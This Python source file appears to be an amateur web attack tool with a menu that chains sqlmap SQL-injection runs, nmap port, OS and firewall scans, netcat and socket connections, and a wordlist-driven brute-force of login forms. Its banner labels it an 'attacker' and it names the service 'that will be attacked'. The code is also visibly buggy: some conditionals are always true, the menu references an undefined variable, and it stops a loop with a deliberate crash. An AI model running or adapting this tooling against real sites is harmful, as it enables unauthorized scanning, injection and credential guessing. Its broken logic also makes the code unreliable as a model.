from urllib.request import urlopen
from urllib.error import URLError
import urllib.parse
import http.client
import requests
from requests.auth import HTTPBasicAuth
#from flask import *
import pprint
import socket
#from socket import *
import sys, time
from datetime import datetime
import nmap3
import json
import subprocess
from socket import gethostbyname
from parsel import Selector
import time
import os

def sql():
    url = ""
    agent = False
    tables = False
    v = True
    while v:
        try:
            os.system("clear")
            print("""
              
        ___
       __H__
 ___ ___[|]_____ ___ ___  
|_ -| _ [|]     | _ | _ |
|___|_  [|]_|_|_|___|  _|
      |_|V          |_| 
      automation
------------------------

1, URL -> """+url+"""
2, random-agent -> """+str(agent)+"""
3, tables -> """+str(tables)+"""

   start -> run program
   
------------------------

[#] select option to change

            """)
            x = input("----> ")
            if x == "start":
                os.system("clear")
                print("[#] running...")
                command = "sqlmap -u "+url+" "
                if tables == True:
                    command = command + "--tables "
                if agent == True:
                    command = command + "--user-agent "
                os.system(command)
                input("[ENTER] continue? ")
                    
            if x == "3":
                os.system("clear")
                print("1) True \n2) False \n[#] enter choice")
                xx = int(input("----> "))
                if xx == 1:
                    tables = True
                if xx == 2:
                    tables = False
            if x == "2":
                os.system("clear")
                print("1) True \n2) False \n[#] enter choice")
                xx = int(input("----> "))
                if xx == 1:
                    agent = True
                if xx == 2:
                    agent = False
            if x == "1":
                os.system("clear")
                valid = False
                while not valid:
                    print("[#] enter url")
                    url = input("----> ")
                    try:
                        request = requests.get(url)
                        if request.status_code == 200:
                            print("[#] website exsist!")
                            valid = True
                        else:
                            print("[!] website dosen't exsist!")
                    except Exception:
                        print("[!] url connection refused or it dosen't exist!")
            else:
                pass
        except KeyboardInterrupt:
            try:
                print("\n\n[CTRL+C] are you sure? ")
                input("[CTRL+C] press agin if you want to exit if not hit enter ")
            except KeyboardInterrupt:
                os.system("clear")
                v = False
            os.system("clear")

def web_scrape():
    start = time.time()
    num = 0
    ### Crawling to the website fetch links and images -> store images -> crawl more to the fetched links and scrap more images
    all_images  = {} # website links as "keys" and images link as "values"
    # GET request to recurship site 
    url = input("[+] enter the url \n---->")
    response = requests.get(url)
    selector = Selector(response.text)
    href_links = selector.xpath('//a/@href').getall()
    image_links = selector.xpath('//img/@src').getall()

    for link in href_links:
        try:
            response = requests.get(link)
            if response.status_code == 200:
                image_links = selector.xpath('//img/@src').getall()
                all_images[link] = image_links
                num = num + 1
        except Exception as exp:
            print('[!] Error navigating to link : ', link)



    print("[+] all imagess")
    print(all_images)
    end = time.time()
    print("[+] Time taken in seconds : ", (end-start))

def url_crape():
    print("""
 ____________
|            |
| URL-SCRAPE |
|____________|

    """)
    f = 0
    print("[url example] https://target_site.com")
    print("[url example] https://target_site.com/login.php")
    print("1. localhots \n2. external url")
    u = int(input("----> "))
    if u == 2:
        url = input("[+] enter the url to grab :")
    if u == 1:
        print("[+] what port is the serveR on")
        pot = input("----> ")
        url = "http://localhost:",pot
    print("[url] url = " + url)
    #grab url
    from requests import Session
    from bs4 import BeautifulSoup as bs
    with urllib.request.urlopen(url) as grab:
        try:
            print("[+] opening url")
            grab_check = grab.getcode()
            if grab_check == 200:
                print("[+] url excepting connections")
                f = 1
                #print("[+] attempting to get the auth veriables")
                #code = grab.read()
                #print("[+] start code")
                #print(code)
                #input("[ENTER] end code ")
            #page_grab = page_grab.dencode('ascii')
            elif url != 200:
                print("[+] error can't get code trying to get header")
        except URLError:
            print("[error] can't load the provided url")
    #display out putt
    print("[=] all done!")
    print("[=] displying page grab :")
    print(grab.info())
    print("[=] end of page grab")
    print("[=] end info")
    print("[=] the url was :" + url)
    cho = int(input("[1, more indepth scan / 2, exit] ----> "))
    if cho == 2:
        print("[-] ok")
        print("[-] hope to see you again!")
        sys.exit(1)
    if cho == 1:
        print("[+] getting host ip")
        try:
            url1 = url.replace("https://", "")
            print("url1")
            print(url)
            input(" 0 ")
            ip = socket.gethostbyname(url1)
        except socket.gaierror:
            print("[-] url not known can't continue")
        print("[+] gto the host ip : " + ip)
        print("[+] starting nmap scan for open ports")
        command = "nmap -F " + ip
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        print("[+] unfilterd ports some mat be used for other exploition that this script may not use")
        print("[+] open ports")
        n = res.stdout
        n = str(n)
        print(n)
        if "80/tcp open  http\n" or "80/tcp   open     http" in n:
            print("[+] service that will be attacked")
            p = 80
            pp = str(p)
            print("[port] " + pp + " \n[service running] http \n[open status] open")
            op = "open"
        print("[+] startin os detection")
        command = "nmap -O " + ip
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        n = res.stdout
        n = str(n)
        print("[+] os")
        print(n)
        print("[+] detecting firewall")
        command = "nmap -sA " + ip + " -p " + pp
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        n = res.stdout
        n = str(n)
        if "unfiltered http"  in n:
            print("[port] " + pp + " \n[service running] http \n[open status] open \n[firewall] none")
        print("[+] attempting a connection 1/?")
        command = "nc " + ip + " " + pp #HEAD / HTTP/1.0 && HEAD / HTTP/1.1
        res = subprocess.run(command, shell=True)
        print("[+] did it work?")
        ch = input("[y/n] ---->")
        if ch == "n" or "N":
            print("[+] attempting conenction 2/?")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                print ("[+] socket successfully created")
                try:
                    print("[ip] " + ip)
                    print("[port] " + pp)
                    s.connect((ip, p))
                    print("[+] succesfully connected!")
                    print("[+] sending data")
                    data = "signIn=tol\npasswd=123"
                    print("[+] data being sent")
                    print(data)
                    s.send(data.encode())
                except:
                    print("[+] faild!")
        else:
            x = input("[y/n] contine?")
            if x == "n" or "N":
                print("[-] ok!")
                sys.exit(1)
            else:
                print("[+] yey!")
        input("[continue?] hit enter if yes")
        print("[+] starting 3/?")
        x = True
        usernum = 0
        pasnum = 0
        user = input("[ ] enter the path to the user file : ")
        passy = input("[ ] enter the path to the password file : ")
        def usr_pas_link():
            global usernum, pasnum, user, passy, url, x
            users = open(user,"r+")
            pasy = open(passy,"r+")
            try:
                user1 = users.readlines()[usernum]
                pas = pasy.readlines()[pasnum]
                users = user1.replace("\n", "")
                pasy = pas.replace("\n", "")
                data = {
                    'j_username': users,
                    'j_password': pasy
                }
                response = requests.post(
                    url,
                    data=data
                )
                ss = str(response)
                if ss == "<Response [200]>":
                    print("[=] both username and password was succsefull")
                    close_if_all_users_are_dine = veriable_that_causes_error + 1
                    x = False
                pasnum = pasnum + 1
                print("data")
                print(data)
            except IndexError:
                print("moving on to next user")
                usernum = usernum + 1
                try:
                    print(" ")
                    close_if_all_users_are_done = users[usernum]
                except TypeError:
                    print("[ ] all users have been tried")
                    x = False
                pasnum = 0
        while x:
            usr_pas_link()
        input("[ENTER] continue? ")
def main():
    os.system("clear")
    run = True
    try:
        while run:
            print("""             
                __        __  ___   ___
                \ \      / / |  _| | _ \ 
                 \ \    / /  | |_  |   /
                  \ \/\/ /   |  _| |  |  
                   \    /    | |_  | _ \ 
                    \/\/     |___| |___/
                         attacker
                         
                    -------------------------

                    1. SQL automation
                    2. URL-SCRAPE
                    3. webscrapper

                    -------------------------


                    [#] enter choice
            """)
            cho = int(input("----> "))
            os.system("clear")
            if cho == 1:
                sql()
            if cho == 2:
                url_crape()
            if ch == 3:
                web_scrape()
    except KeyboardInterrupt:
        try:
            print("\n\n[CTRL+C] are you sure? ")
            input("[CTRL+C] press agin if you want to exit if not hit enter ")
        except KeyboardInterrupt:
            run = False
        os.system("clear")
